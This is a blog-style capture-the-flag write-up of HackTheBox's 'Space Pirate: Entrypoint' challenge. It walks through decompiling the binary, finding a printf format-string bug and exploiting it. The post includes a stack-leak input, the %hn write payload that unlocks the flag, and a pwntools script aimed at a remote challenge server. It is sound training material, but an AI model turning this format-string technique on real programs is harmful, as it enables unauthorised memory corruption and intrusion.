---
layout: post
title: Binary Exploitation&#58; HacktheBox/Space Pirate Entrypoint
---

## HacktheBox Space Pirate Entrypoint Write-up

To start, let's run the program. We are prompted for a choice between scanning our card and inserting a password. When we use the ```scan card``` option, we are asked for the card's serial number. Input leads to an Invalid ID message and the program exiting. The ```insert password``` option is similar, except is asks for a password instead of a serial.

Let's check the file type.
```
└─$ file sp_entrypoint
sp_entrypoint: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9929f2d6b7a50a00cb151fce627175f6461c0b91, not stripped
```

We are dealing with a 64 bit ELF executable, dynamically linked, and not stripped. This is good news.

Now to check for securities on the binary.
```
└─$ checksec --file=sp_entrypoint
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   82 Symbols	  No	0		2		sp_entrypoint
```

Full relro, a canary, NX enable, and PIE. So no shellcode injection or overwriting the return address. Let's see what ghidra tells us.

### Reversing

The main function is fairly straight forward.
```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  char local_38 [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  local_48 = 0xdeadbeef;
  local_40 = &local_48;
  printf(&DAT_001025e0);
  lVar1 = read_num();
  if (lVar1 != 1) {
    if (lVar1 == 2) {
      check_pass();
    }
    printf(&DAT_00102668,&DAT_0010259a);
                    /* WARNING: Subroutine does not return */
    exit(0x1b39);
  }
  printf("\n[!] Scanning card.. Something is wrong!\n\nInsert card\'s serial number: ");
  read(0,local_38,31);
  printf("\nYour card is: ");
  printf(local_38);
  if (local_48 == 0xdead1337) {
    open_door();
  }
  else {
    printf(&DAT_001026a0,&DAT_0010259a);
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So it looks like to get the flag, we need to access the ```open_door()``` function. To do this, we need the variable ```local_48``` to equal ```0xdead1337```. It is initialized at the beginning ```main``` to ```0xdeadbeef```. Now we need to find a way to do that.

The first thing I notice is a format string vulnerability on this line:
```c
printf(local_38);
```

Format string vulnerabilities happen when the proper arguments are not passed to a string processing function such as ```printf```. Normally, the first argument would be the *format string*, such as ```"Hello, my name is %s!\n"```, the following arguments passed to the function must correspond with the format specifiers in the format string, or else ```printf``` will use the data at where the argument *should* have been. A more thorough breakdown of format strings can be found [here](https://axcheron.github.io/exploit-101-format-strings/).

How does this help us write to memeory? By using the ```%n``` specifier. This specifier will write the number of bytes expressed as an integer to the corresponding argument. For instance:
```
printf("Hello, my name is %n!\n", &num);
```

In this case, ```num``` would hold the value ```18```. We can use this to overwrite the contents of ```local_48```.

### Pwn

To leverage this vulnerability, we need to find out how many stack addresses our target it away, to do this, we simply need to input a bunch of ```%p``` where our payload should go.
```
Insert card's serial number: %p %p %p %p %p %p %p %p %p

Your card is: 0x7ffdd9766a50 0x7f062b4508c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffdd97690f0 0x7025207025207025 0x2520702520702520
E�U
```

We see that ```0xdeadbeef``` is 6 arguments away, and the pointer to ```deadbeef``` is 7 arguments away. Since argument 7 points to our target, we can use argument 7 to overwrite argument 6. Now we need to simply overwrite the lowest 2 byte orders of ```0xdeadbeef``` with ```0x1337``` which, expressed as an integer, is ```4919```. Let's craft our payload and test it. Note that the format specifier for a ```short``` is ```%hn```.
```
Insert card's serial number: %4919c%7$hn 

Your card is:                         





[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
```

Now to craft the exploit.
```python
#!/usr/bin/env python3

from pwn import *

payload = b"%4919c%7$hn"

p = remote("157.245.32.12", 31901)
p.recvuntil("> ")
p.sendline(b"1")
p.recvuntil("Insert card's serial number: ")
p.sendline(payload)

p.interactive()
```

Et Voila!
